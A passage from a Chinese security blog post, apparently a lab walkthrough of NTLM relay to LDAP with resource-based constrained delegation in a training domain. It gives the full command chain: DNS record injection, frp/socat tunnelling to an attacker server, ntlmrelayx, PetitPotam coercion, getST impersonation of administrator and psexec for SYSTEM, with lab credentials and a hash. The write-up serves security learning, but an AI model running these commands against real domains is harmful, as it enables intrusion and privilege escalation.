+<p>1、<code>Windows Workstation</code>默认安装 <code>WebClient</code>服务，但是需要手动启动，<code>Windows Server</code>则默认未安装<code>WebClient</code></p>
+<p>2、<code>WebClient</code>仅对本地内部网或收信任的站点列表中的目自动使用当前用户凭据进行<code>NTLM</code>认证，所以在复现&#x2F;攻击前，需要利用已经获取的域用户权限，在域内为攻击机添加一条<code>dns</code>记录。</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3">https://github.com/dirkjanm/krbrelayx，使用方法参考文档</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> dnstool.<span class="keyword">py</span> -<span class="keyword">u</span> hack-my.<span class="keyword">com</span>\win2008 -<span class="keyword">p</span> <span class="string">&quot;密码&quot;</span> -r evil.hack-my.<span class="keyword">com</span> -d <span class="number">192.168</span>.<span class="number">43.78</span> --action <span class="built_in">add</span> ldap://<span class="number">192.168</span>.<span class="number">43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击流程</strong></p>
+<p>(1) 拿下一名域用户</p>
+<p>(2) 探测开启<code>WebClient</code></p>
+<p>(3) 在域内为攻击机添加<code>DNS</code>解析</p>
+<p>(4) 强制<code>WebClient</code>对攻击机指定端口进行身份验证</p>
+<p>(5) <code>RBCD</code>攻击</p>
+<p><strong>复现环境 (春秋云镜Spoofing)</strong></p>
+<p><strong>攻击者公网服务器：</strong><code>Ubuntu</code>，<code>101.42.13.105</code></p>
+<p><strong>入口机：</strong><code>Ubuntu</code>，<code>39.99.154.66</code> | <code>172.22.11.76</code></p>
+<p>**目标机器：<code>**XIAORANG\XR-LCM3AE8B</code>，<code>172.22.11.26</code>，开启<code>WebClient</code>服务，不出网</p>
+<p>**域控：<code>**XIAORANG\XIAORANG-DC</code>，<code>172.22.11.6</code></p>
+<p>**已经拿下的域用户和域内机器：<code>**Windows Server 2008</code>，<code>yangmei : xrihGHgoNZQ</code></p>
+<p>**目标：**利用拿下的域用户和<code>WIN2008</code>，横向拿下<code>172.22.11.26</code>这台机器</p>
+<p><strong>既然目标机器不出网，可以用frp+socat来实现。</strong></p>
+<p><strong>将入口机<code>172.22.11.76</code>作为”跳板机”，让目标机器将流量转发至<code>172.22.11.76:80</code>，利用<code>socat</code>将<code>172.22.11.76:80</code>的流量转发至公网服务器<code>101.42.13.105:7000</code>，公网服务器通过<code>frp</code>内网穿透将流量转发至<code>kali linux</code>的<code>80</code>端口。</strong></p>
+<p><code>frps.toml</code></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bindPort</span> <span class="operator">=</span> <span class="number">6000</span></span><br></pre></td></tr></table></figure>
+
+<p><code>frpc.toml</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;101.42.13.105&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">6000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;attack&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure>
+
+<p>跳板机上传<code>socat</code>进行端口转发</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">80</span>,fork TCP:<span class="number">101.42.13.105:7000</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击机<code>ntlmrelyx</code>开启监听，设置通过<code>NTLM</code>中继来配置<code>RBCD</code></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python ntlmrelayx.py -t ldap:<span class="string">//172.22.11.6</span> <span class="params">--escalate-user</span> XR-DESKTOP\$ <span class="params">--delegate-access</span> <span class="params">--no-dump</span></span><br></pre></td></tr></table></figure>
+
+<p>通过利用<code>PetitPotam</code>强制目标主机<code>172.22.11.26</code>认证到<code>172.22.11.76</code> (出网的<code>ubuntu</code>服务器) -&gt; 会被转发到攻击机<code>80</code>端口</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602210622949.png" alt="image-20250602210622949"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python PetitPotam<span class="selector-class">.py</span> -u yangmei -<span class="selector-tag">p</span> <span class="string">&quot;xrihGHgoNZQ&quot;</span> -d xiaorang<span class="selector-class">.lab</span> ubuntu@<span class="number">80</span>/webdav <span class="number">172.22</span>.<span class="number">11.26</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602211546827.png" alt="image-20250602211546827"></p>
+<p>成功配置<code>RBCD</code></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602211606974.png" alt="image-20250602211606974"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python getST<span class="selector-class">.py</span> -dc-ip <span class="number">172.22</span>.<span class="number">11.6</span> -spn cifs/XR-LCM3AE8B<span class="selector-class">.xiaorang</span><span class="selector-class">.lab</span> -impersonate administrator xiaorang.lab/XR-DESKTOP\$ -hashes :<span class="number">29</span>a34bea4cdae24fdb6661b2071d9ffd</span><br></pre></td></tr></table></figure>
+
+<p>或者可以利用拿到的域用户新建一个机器账户，然后用明文密码拿目标主机的白银票据</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python addcomputer.py xiaorang.<span class="keyword">lab</span>/yangmei:<span class="string">&quot;xrihGHgoNZQ&quot;</span> -computer-name <span class="keyword">TEST</span>$ -computer-pass 123456 -dc-host XIAORANG-DC.xiaorang.<span class="keyword">lab</span> -dc-ip 172.22.11.6</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST<span class="selector-class">.py</span> -dc-ip <span class="number">172.22</span>.<span class="number">11.6</span> -spn cifs/XR-LCM3AE8B<span class="selector-class">.xiaorang</span><span class="selector-class">.lab</span> -impersonate administrator xiaorang.lab/XR-DESKTOP\$:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602212944606.png" alt="image-20250602212944606"></p>
+<p>横向拿到目标主机<code>system</code>权限</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">export</span> KRB5CCNAME=administrator<span class="variable">@cifs_XR</span>-LCM3AE8B.xiaorang.lab<span class="variable">@XIAORANG</span>.LAB.ccache</span><br><span class="line">proxychains4 python psexec.py  <span class="string">&quot;XR-LCM3AE8B.xiaorang.lab&quot;</span> -target-ip <span class="number">172.22.11.26</span> -dc-ip <span class="number">172.22.11.6</span> -<span class="literal">no</span>-pass -k</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602214113408.png" alt="image-20250602214113408"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/05/22/AITTACK%20-%20%E5%88%A9%E7%94%A8AI%E4%B8%AD%E8%BD%AC%E7%AB%99%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB_cos/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-05-22 13:16:47
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2026/05/22/12%E5%A4%A9-%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E6%B1%87%E6%80%BB/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%8E%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">约束委派与非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-text">非约束性委派利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-text">约束性委派利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-RBCD"><span class="toc-text">基于资源的约束委派[RBCD]</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RBCD%E6%A6%82%E8%BF%B0"><span class="toc-text">RBCD概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%A6%82%E8%BF%B0"><span class="toc-text">攻击利用概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-text">域用户本地提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E6%8F%90%E6%9D%83"><span class="toc-text">域内服务账户提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NTLM-Relay-to-ldap-RBCD"><span class="toc-text">NTLM Relay to ldap + RBCD</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2026 Oranges</a>
+      
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+      
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+
+  <script src="https://unpkg.com/mermaid@10.9.1/dist/mermaid.min.js"></script>
+  <script>
+    if (window.mermaid) {
+      var options = {"startOnLoad":true,"theme":"default"};
+      window.mermaid.initialize(options);
+      window.mermaid.run({ querySelector: '.mermaid' });
+    }
+  </script>
+
+
+
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Windows%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%AF%B9%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5 + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2026%2F05%2F22%2F%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F%25E4%25B8%25AD%25E5%25A7%2594%25E6%25B4%25BE%25E6%2594%25BB%25E5%2587%25BB%25E5%2588%25A9%25E7%2594%25A8%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2026/05/22/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
